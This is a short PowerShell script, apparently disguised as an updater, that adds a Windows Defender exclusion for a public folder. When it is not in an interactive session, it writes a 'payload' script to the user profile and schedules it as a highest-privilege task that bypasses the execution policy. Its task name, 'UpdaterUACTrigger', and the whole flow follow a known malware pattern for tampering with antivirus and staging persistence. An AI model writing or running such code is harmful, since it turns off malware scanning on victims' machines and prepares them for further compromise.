# Log file
$log = "C:\Windows\Temp\updater_log.txt"
function Log($msg) {
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $log -Append -Encoding utf8
}

Log "Script executed by user: $env:USERNAME"

# Check if in SYSTEM or non-interactive session
$whoami = whoami
if ($whoami -like "*system*" -or -not ([Environment]::UserInteractive)) {
    Log "⏳ Not in interactive user context or not admin. Deferring to scheduled task..."

    $taskName = "UpdaterUACTrigger"
    $taskScript = "$env:USERPROFILE\UpdaterUAC.ps1"
    $payload = @'
Start-Sleep -Seconds 5
Add-MpPreference -ExclusionPath "C:\Users\Public\TestSafeFolder"
'@

    $payload | Out-File -FilePath $taskScript -Encoding utf8

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScript`""
    $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) 
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
        Log "✅ Scheduled task '$taskName' created."
    } catch {
        Log "❌ Failed to create scheduled task: $_"
    }
    exit
}

# If already in interactive + admin, run exclusion
try {
    Add-MpPreference -ExclusionPath "C:\Users\Public\TestSafeFolder" -ErrorAction Stop
    Log "✅ Exclusion added successfully."
} catch {
    Log "❌ Failed to add exclusion: $_"
}
